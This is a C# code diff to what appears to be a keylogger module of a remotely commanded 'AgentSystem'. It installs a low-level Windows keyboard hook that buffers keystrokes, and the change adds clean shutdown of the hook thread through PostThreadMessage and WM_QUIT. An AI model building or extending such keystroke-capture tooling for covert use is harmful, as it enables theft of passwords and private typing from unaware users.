@@ -15,6 +15,7 @@ namespace AgentSystem.Modules
         private bool isLogging = false;
         private string activeCommandId = string.Empty;
         private Thread hookThread; 
+        private uint hookThreadId = 0;
         private readonly object _stateLock = new object();
 
         private readonly List<object> keyBuffer = new List<object>();
@@ -26,11 +27,18 @@ namespace AgentSystem.Modules
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_SYSKEYDOWN = 0x0104;
+        private const uint WM_QUIT = 0x0012;
 
         private LowLevelKeyboardProc hookProc; 
         private IntPtr hookId = IntPtr.Zero;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint GetCurrentThreadId();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool PostThreadMessage(uint threadId, uint msg, IntPtr wParam, IntPtr lParam);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -123,6 +131,11 @@ namespace AgentSystem.Modules
                 {
                     UnhookWindowsHookEx(hookId);
                     hookId = IntPtr.Zero;
+                }
+                if (hookThreadId != 0)
+                {
+                    PostThreadMessage(hookThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
+                    hookThreadId = 0;
                 }
 
                 hookThread = null; 
